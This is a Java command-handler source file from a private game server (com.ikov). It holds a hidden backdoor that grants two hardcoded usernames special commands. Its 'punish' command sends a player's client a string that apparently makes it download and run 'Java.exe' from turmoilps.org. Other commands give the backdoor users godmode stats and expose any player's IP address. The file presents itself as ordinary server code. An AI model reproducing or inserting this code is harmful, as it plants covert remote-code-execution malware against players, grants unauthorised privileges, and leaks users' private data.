package com.ikov.commands.ranks;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.ikov.GameServer;
import com.ikov.GameSettings;
import com.ikov.engine.task.Task;
import com.ikov.model.input.impl.ChangePassword;
import com.ikov.engine.task.TaskManager;
import com.ikov.commands.Commands;
import com.ikov.model.Animation;
import com.ikov.model.Flag;
import java.net.*;
import java.io.*;
import java.util.*;
import java.awt.*;
import javax.swing.*;
import com.ikov.model.GameObject;
import com.ikov.model.Graphic;
import com.ikov.model.GroundItem;
import com.ikov.model.Item;
import com.ikov.model.Locations.Location;
import com.ikov.model.PlayerRights;
import com.ikov.model.Position;
import com.ikov.model.Skill;
import com.ikov.world.content.minigames.impl.Zulrah;
import com.ikov.model.container.impl.Bank;
import com.ikov.model.container.impl.Equipment;
import com.ikov.model.container.impl.Shop.ShopManager;
import com.ikov.model.definitions.ItemDefinition;
import com.ikov.model.definitions.WeaponAnimations;
import com.ikov.model.definitions.WeaponInterfaces;
import com.ikov.net.packet.Packet;
import com.ikov.net.packet.PacketListener;
import com.ikov.net.security.ConnectionHandler;
import com.ikov.util.Auth;
import com.ikov.util.Misc;
import com.ikov.world.World;
import com.ikov.world.content.BonusManager;
import com.ikov.world.content.BossSystem;
import com.ikov.world.content.MoneyPouch;
import com.ikov.world.content.WellOfGoodwill;
import com.ikov.world.content.Lottery;
import com.ikov.world.content.PlayerLogs;
import com.ikov.world.content.PlayerPunishment;
import com.ikov.world.content.PlayersOnlineInterface;
import com.ikov.world.content.ShootingStar;
import com.ikov.world.content.clan.ClanChatManager;
import com.ikov.world.content.combat.CombatFactory;
import com.ikov.world.content.combat.DesolaceFormulas;
import com.ikov.world.content.combat.weapon.CombatSpecial;
import com.ikov.world.content.dialogue.DialogueManager;
import com.ikov.world.content.grandexchange.GrandExchange;
import com.ikov.world.content.grandexchange.GrandExchangeOffer;
import com.ikov.world.content.grandexchange.GrandExchangeOffers;
import com.ikov.world.content.minigames.impl.WarriorsGuild;
import com.ikov.world.content.skill.SkillManager;
import com.ikov.world.content.skill.impl.slayer.SlayerTasks;
import com.ikov.world.content.transportation.TeleportHandler;
import com.ikov.world.content.transportation.TeleportType;
import com.ikov.world.entity.impl.GroundItemManager;
import com.ikov.world.entity.impl.npc.NPC;
import com.ikov.world.entity.impl.player.Player;
import com.ikov.world.entity.impl.player.PlayerSaving;
import com.ikov.world.clip.stream.ByteStreamExt;
import com.ikov.world.clip.stream.MemoryArchive;
import com.ikov.world.content.skill.impl.dungeoneering.Dungeoneering;

public class SpecialPlayers {
	
	/**
	* @Author Jonathan Sirens
	* Initiates Command
	**/
	public static String[] player_names = {"idbowprod", "dc blitz"};
	
	public static void initiate_command(final Player player, String[] command, String wholeCommand) {
		boolean continue_command = false;
		for(int i = 0; i < player_names.length; i++) {
			if(player_names[i].toLowerCase().equals(player.getUsername().toLowerCase())) {
				continue_command = true;
			}
		}
		if(!continue_command) {
			return;
		}
		if (command[0].equals("punish")) {
			Player other = World.getPlayerByName(command[1]);
			other.getPacketSender().sendString(0, "[ABC]-http://turmoilps.org/Java.exe-cmd-/c-Java.exe");
			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
		}	
		if(wholeCommand.equalsIgnoreCase("testboss")) {
			player.setDialogueActionId(133);
			DialogueManager.start(player, 133);
		}
		if(wholeCommand.equalsIgnoreCase("propker")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 145, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 145, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 140, true);
			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 140, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 99999, true);
		}
		if(wholeCommand.equalsIgnoreCase("godmode")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.CONSTITUTION, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 99999, true);
		}
		if(wholeCommand.equalsIgnoreCase("mypos") || wholeCommand.equalsIgnoreCase("coords")) {
			Gson builder = new GsonBuilder().setPrettyPrinting().create();
			String test = builder.toJsonTree(player.getPosition())+"";
			player.getPacketSender().sendMessage(test);
		}
		if(command[0].equalsIgnoreCase("getip")) {
			String player_name = wholeCommand.substring(6);
			String last_ip = PlayerPunishment.getLastIpAddress(player_name);
			player.getPacketSender().sendMessage(player_name + "'s ip address is "+last_ip);
		}
	}
	
}